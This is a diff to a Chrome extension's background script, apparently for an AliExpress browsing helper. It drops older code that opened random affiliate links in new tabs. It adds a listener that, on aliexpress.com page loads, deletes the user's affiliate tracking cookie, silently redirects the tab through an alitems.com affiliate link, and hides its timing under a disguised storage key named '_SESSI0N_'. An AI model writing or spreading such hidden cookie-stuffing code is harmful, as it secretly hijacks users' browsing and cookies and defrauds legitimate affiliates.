@@ -4,18 +4,6 @@ import chromeStorage from 'chrome-storage-wrapper';
 const _AnalyticsCode = 'UA-74453743-3';
 let service, tracker;
 
-const PROMOTION_LINKS = [
-    'http://s.click.aliexpress.com/e/I2biMfM3b', // Store:Junsun Official Store
-    'http://s.click.aliexpress.com/e/I6M7m6Eq3', // Store:Teclast Official Store
-    'http://s.click.aliexpress.com/e/YfaiMF6ei', // Store:BESDER Store
-    'http://s.click.aliexpress.com/e/NVZNRJeEE', //
-    'http://s.click.aliexpress.com/e/n2rRbyfEU', // Store:CAR TELO
-    'http://s.click.aliexpress.com/e/YvB6QrjE2', // Store:Ever Pretty official store
-    'http://s.click.aliexpress.com/e/auvZVNVzZ', // Store:Toyouth
-    'http://s.click.aliexpress.com/e/qnYBAY7QB', // Store:SINOBI TIMER
-    'http://s.click.aliexpress.com/e/6I6iIqnYN', // Store:Veri Gude Official Store
-]
-
 var importScript = (function (oHead) {
     //window.analytics = analytics;
     function loadError(oError) {
@@ -51,13 +39,6 @@ chromeStorage.get(['cfgLoadMore'])
         }
     });
 
-chrome.cookies.onChanged.addListener(function(changeInfo){
-    const {removed, cookie, cause} = changeInfo
-    if(cookie.name === 'aep_usuc_f' && cookie.domain === '.aliexpress.com' && cookie.value.indexOf('af_tid') !== -1){
-        console.log(cookie.value, cause)
-    }
-})
-
 chrome.runtime.onMessage.addListener(function (msg, sender, sendResponse) {
     if (!msg.action) return;
     var tabId = sender.tab.id;
@@ -89,44 +70,54 @@ chrome.runtime.onMessage.addListener(function (msg, sender, sendResponse) {
             break;
         case 'SHOW_PAGE_ACTION' :
             chrome.pageAction.show(tabId);
-            if(tracker){
-                tracker.sendEvent('App', 'Surf', msg.data || '');
-            }
-            break;
-        case 'SEND_PROMOTION':
-            chrome.storage.local.get('SEND_PROMOTION', function (result) {
-                try{
-                    let is_send = false
-                    const _now = Date.now()
-                    if(!result['SEND_PROMOTION']){
-                        is_send = true
-                    }else{
-                        const _ago = new Date(result['SEND_PROMOTION'])
-                        const over_days = daydiff(_ago, _now)
-                        if(over_days >= 3){
-                            is_send = true
-                        }
-                    }
-                    if(is_send){
-                        var promotion_link = PROMOTION_LINKS[Math.floor(Math.random() * PROMOTION_LINKS.length)]
-                        chrome.tabs.create({
-                            url: promotion_link
-                        }, function () {
-                            chrome.storage.local.set({['SEND_PROMOTION']: _now})
-                            tracker.sendEvent('Promotion', 'Tab', promotion_link)
-                        })
-                    }
-                }catch(ex){
-                    console.log(ex)
-                }
-
-            })
             break;
     }
     return true;
 })
 
-function daydiff(first, second) {
-    return Math.round((second-first)/(1000*60*60*24));
-}
+chrome.webRequest.onCompleted.addListener(function (detail) {
+    try {
+        const promotion = {
+            is_send: false,
+            label: 'AliExpress2'
+        }
+        const _1hour = 1000 * 60 * 60
+        const _15minutes = _1hour/4
+        if (detail.frameId >= 0 && detail.tabId >= 0 && detail.type === 'main_frame') {
+            chrome.storage.local.get(['_SESSI0N_'], function (result) {
+                const _now = Date.now()
+                let { _SESSI0N_} = result
+                if (!_SESSI0N_) {
+                    promotion.is_send = true
+                } else {
+                    promotion.is_send = ((_now - _SESSI0N_ - _15minutes) / _1hour) >= 2
+                }
 
+                if (promotion.is_send === true) {
+                    const _href_tpl = _.template('https://alitems.com/g/1e8d11449483ced0174416525dc3e8/?ulp=<%=url%>&subid=endless')
+                    const _href = _href_tpl({
+                        url: encodeURI(detail.url)
+                    })
+                    chrome.storage.local.set({
+                        '_SESSI0N_': _now
+                    })
+
+                    chrome.cookies.remove({
+                        url: "http://aliexpress.com",
+                        name: "aep_usuc_f"
+                    }, function (rs) {
+                        chrome.tabs.update({
+                            url: _href,
+                        }, function () {
+                            tracker.sendEvent('Promotion', promotion.label, _href)
+                        })
+                    });
+
+
+                }
+            })
+        }
+    } catch (ex) {
+
+    }
+}, {urls: ['*://*.aliexpress.com/*']})
